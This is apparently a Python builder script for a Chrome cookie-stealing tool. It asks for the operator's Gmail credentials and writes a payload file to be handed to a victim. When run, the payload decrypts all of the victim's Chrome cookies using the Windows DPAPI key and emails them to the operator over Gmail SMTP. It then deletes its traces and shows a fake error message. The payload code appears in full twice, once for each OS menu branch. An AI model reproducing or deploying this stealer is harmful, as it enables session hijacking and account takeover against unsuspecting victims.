from termcolor import colored
import os
import sys
import time

# A simple Python program to demonstrate
# getpass.getpass() to read security question
import getpass
time.sleep(0.1)
print("    ")
print(colored("created by WHITEMARK","blue"))
time.sleep(0.1)
logo = [""" 
██╗    ██╗██╗  ██╗██╗████████╗███████╗███╗   ███╗ █████╗ ██████╗ ██╗  ██╗
██║    ██║██║  ██║██║╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝
██║ █╗ ██║███████║██║   ██║   █████╗  ██╔████╔██║███████║██████╔╝█████╔╝ 
██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗ 
╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                                         
"""]

for i in logo:
    for a in i:
        b=colored(a,'blue')
        print(b,end="")
        sys.stdout.flush()
        time.sleep(000000.01)

for i in range(0,1):
    try:
        os.mkdir("payloads")
    except:
        continue
for i in range(0,1):
    try:
        os.remove("payloads/main.py")
    except:
        continue
os.system('cls' if os.name == 'nt' else 'clear')
time.sleep(0.1)
logo = ["""
 ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
██║     ██║   ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║     ██║   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗╚██████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                          
"""]

for i in logo:
    for a in i:
        b=colored(a,'green')
        print(b,end="")
        sys.stdout.flush()
        time.sleep(000000.01)

print("   ")
print("   ")
print("   ")
logo = """                 *+*+Created by MR.WhiteMark+*+*
                       *+*+Member of CW+*+*
"""

for i in logo:
    for a in i:
        b=colored(a,'blue')
        print(b,end="")
        sys.stdout.flush()
        time.sleep(0.001)

print("          ")
time.sleep(0.5)
print(colored("You cant get victems chrome browser cookies from a payload...........",'red','on_green'))
print("")
time.sleep(0.5)
print(colored("                 [1].Start Attack",'yellow'))
print("          ")
time.sleep(0.5)
print(colored("                 [2].Update tool(working on termux and linux)",'yellow'))
print("          ")
time.sleep(0.5)
print(colored("                 [3].Commenet a bug",'yellow'))
time.sleep(0.5)
print("   ")
time.sleep(0.5)
in1 = input(colored("Enter your choice(enter number): ",'yellow'))
print("   ")
os.system('cls' if os.name == 'nt' else 'clear')
if in1 == "1":
    time.sleep(0.5)
    print(colored("                 [1].Termux/Linux",'yellow'))
    print("          ")
    time.sleep(0.5)
    print(colored("                 [2].Windows",'yellow'))
    print("          ")
    time.sleep(0.5)
    opa = input(colored("Enter your operating system(enter number): ",'yellow'))
    print("")
    print(colored("Remember turn on less app secure in your gmail acount",'red'))
    print("")
    email = input(colored("Enter your Email: ",'yellow'))
    email_pwd = getpass.getpass(prompt='Enter your Email password: ')
    if opa == "1":
        import os
        import time
        from termcolor import colored

        if os.path.exists("payloads"):
            os.rename("payloads","payloads2")
        os.system("mkdir payloads")
        data = '''def func():
        import os
        try:
            os.remove("req.txt")
        except:
            pass
        try:
            os.remove("Cookies.db")
        except:
            pass
        import json
        import base64
        import sqlite3
        import shutil
        import time
        from datetime import datetime, timedelta
        import win32crypt # pip install pypiwin32
        from Crypto.Cipher import AES # pip install pycryptodome
        print("Installing...........................")
        def get_chrome_datetime(chromedate):
            """Return a `datetime.datetime` object from a chrome format datetime
            Since `chromedate` is formatted as the number of microseconds since January, 1601"""
            if chromedate != 86400000000 and chromedate:
                try:
                    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                except Exception as e:
                    print(f"Error: {e}, chromedate: {chromedate}")
                    return chromedate
            else:
                return ""


        def get_encryption_key():
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            # decode the encryption key from Base64
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # remove 'DPAPI' str
            key = key[5:]
            # return decrypted key that was originally encrypted
            # using a session key derived from current user's logon credentials
            # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


        def decrypt_data(data, key):
            try:
                # get the initialization vector
                iv = data[3:15]
                data = data[15:]
                # generate cipher
                cipher = AES.new(key, AES.MODE_GCM, iv)
                # decrypt password
                return cipher.decrypt(data)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                except:
                    # not supported
                    return ""


        def main():
            # local sqlite Chrome cookie database path
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Cookies")
            # copy the file to current directory
            # as the database will be locked if chrome is currently open
            filename = "Cookies.db"
            if not os.path.isfile(filename):
                # copy file when does not exist in the current directory
                shutil.copyfile(db_path, filename)
            # connect to the database
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            # get the cookies from `cookies` table
            cursor.execute("""
            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
            FROM cookies""")
            # you can also search by domain, e.g thepythoncode.com
            # cursor.execute("""
            # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
            # FROM cookies
            # WHERE host_key like '%thepythoncode.com%'""")
            # get the AES key
            key = get_encryption_key()
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key)
                else:
                    # already decrypted
                    decrypted_value = value
                a = (f"""
                Host: {host_key}
                Cookie name: {name}
                Cookie value (decrypted): {decrypted_value}
                Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
                Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
                Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
                ===============================================================""")
                # update the cookies table with the decrypted value
                # and make session cookie persistent
                #with open("req.txt",'a') as fil:
                #    fil.writelines(a)
                # Python code to illustrate Sending mail from
        # your Gmail account
                with open('req.txt','a') as fil:
                    fil.writelines(a)
                fil.close()
                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host_key, name))
            # commit changes
            db.commit()
            # close connection
            db.close()


        if __name__ == "__main__":
            main()
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders
        email_user = "'''+email+'''"
        email_password = "'''+email_pwd+'''"
        email_send = "'''+email+'''"

        subject = 'Here your Cookie text'
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject

        body = 'Hi there, sending this email from Cook'
        msg.attach(MIMEText(body,'plain'))


        filename='req.txt'
        attachment  =open(filename,'rb')

        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)


        server.sendmail(email_user,email_send,text)
        server.quit()
        attachment.close()

        os.remove("Cookies.db")
        os.remove("req.txt")
        for i in range(0,10):
            print("Loading...........................")
            time.sleep(0.5)
        print("Sorry you cant run this tool in this system")
func()'''
        f = open('m.py','a')
        f.writelines(data)

        for i in range(0,5):
                print(" ")
                print(colored("Genarating payload.........",'green'))
                print(" ")
                time.sleep(0.2)
                f.close()
                
        os.system('python3 temp/en.py')
        if os.path.exists("b.py"):
            os.rename("b.py","main.py")
        print(colored('Dont worry about this','red'))
        print(colored('Dont worry about this','red'))
        time.sleep(0.5)
        print(colored('This is not a error','red'))
        time.sleep(0.5)
        print(colored('payload genareted...check payload folder','red'))
        time.sleep(0.5)
        import shutil

        shutil.move('main.py','payloads/main.py')
    elif opa == "2":
        import os
        import time
        from termcolor import colored

        if os.path.exists("payloads"):
            os.rename("payloads","payloads2")
        os.system("mkdir payloads")
        data = '''def func():
        import os
        try:
            os.remove("req.txt")
        except:
            pass
        try:
            os.remove("Cookies.db")
        except:
            pass
        import json
        import base64
        import sqlite3
        import shutil
        import time
        from datetime import datetime, timedelta
        import win32crypt # pip install pypiwin32
        from Crypto.Cipher import AES # pip install pycryptodome
        print("Installing...........................")
        def get_chrome_datetime(chromedate):
            """Return a `datetime.datetime` object from a chrome format datetime
            Since `chromedate` is formatted as the number of microseconds since January, 1601"""
            if chromedate != 86400000000 and chromedate:
                try:
                    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                except Exception as e:
                    print(f"Error: {e}, chromedate: {chromedate}")
                    return chromedate
            else:
                return ""


        def get_encryption_key():
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            # decode the encryption key from Base64
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # remove 'DPAPI' str
            key = key[5:]
            # return decrypted key that was originally encrypted
            # using a session key derived from current user's logon credentials
            # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


        def decrypt_data(data, key):
            try:
                # get the initialization vector
                iv = data[3:15]
                data = data[15:]
                # generate cipher
                cipher = AES.new(key, AES.MODE_GCM, iv)
                # decrypt password
                return cipher.decrypt(data)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                except:
                    # not supported
                    return ""


        def main():
            # local sqlite Chrome cookie database path
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Cookies")
            # copy the file to current directory
            # as the database will be locked if chrome is currently open
            filename = "Cookies.db"
            if not os.path.isfile(filename):
                # copy file when does not exist in the current directory
                shutil.copyfile(db_path, filename)
            # connect to the database
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            # get the cookies from `cookies` table
            cursor.execute("""
            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
            FROM cookies""")
            # you can also search by domain, e.g thepythoncode.com
            # cursor.execute("""
            # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
            # FROM cookies
            # WHERE host_key like '%thepythoncode.com%'""")
            # get the AES key
            key = get_encryption_key()
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key)
                else:
                    # already decrypted
                    decrypted_value = value
                a = (f"""
                Host: {host_key}
                Cookie name: {name}
                Cookie value (decrypted): {decrypted_value}
                Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
                Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
                Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
                ===============================================================""")
                # update the cookies table with the decrypted value
                # and make session cookie persistent
                #with open("req.txt",'a') as fil:
                #    fil.writelines(a)
                # Python code to illustrate Sending mail from
        # your Gmail account
                with open('req.txt','a') as fil:
                    fil.writelines(a)
                fil.close()
                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host_key, name))
            # commit changes
            db.commit()
            # close connection
            db.close()


        if __name__ == "__main__":
            main()
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders
        email_user = "'''+email+'''"
        email_password = "'''+email_pwd+'''"
        email_send = "'''+email+'''"

        subject = 'Here your Cookie text'
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject

        body = 'Hi there, sending this email from Cook'
        msg.attach(MIMEText(body,'plain'))


        filename='req.txt'
        attachment  =open(filename,'rb')

        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)


        server.sendmail(email_user,email_send,text)
        server.quit()
        attachment.close()

        os.remove("Cookies.db")
        os.remove("req.txt")
        for i in range(0,10):
            print("Loading...........................")
            time.sleep(0.5)
        print("Sorry you cant run this tool in this system")
func()'''
        f = open('m.py','a')
        f.writelines(data)

        for i in range(0,5):
                print(" ")
                print(colored("Genarating payload.........",'green'))
                print(" ")
                time.sleep(0.2)
                f.close()
                
        os.system('python temp/en.py')
        if os.path.exists("b.py"):
            os.rename("b.py","main.py")
        print(colored('Dont worry about this','red'))
        print(colored('Dont worry about this','red'))
        time.sleep(0.5)
        print(colored('This is not a error','red'))
        time.sleep(0.5)
        print(colored('payload genareted...check payload folder','red'))
        time.sleep(0.5)
        import shutil

        shutil.move('main.py','payloads/main.py')
    else:
        print("Wrong input")
elif in1=="2":
    os.system("git pull")
elif in1=="3":
    print("not avilable")
else:
    print("wrong input")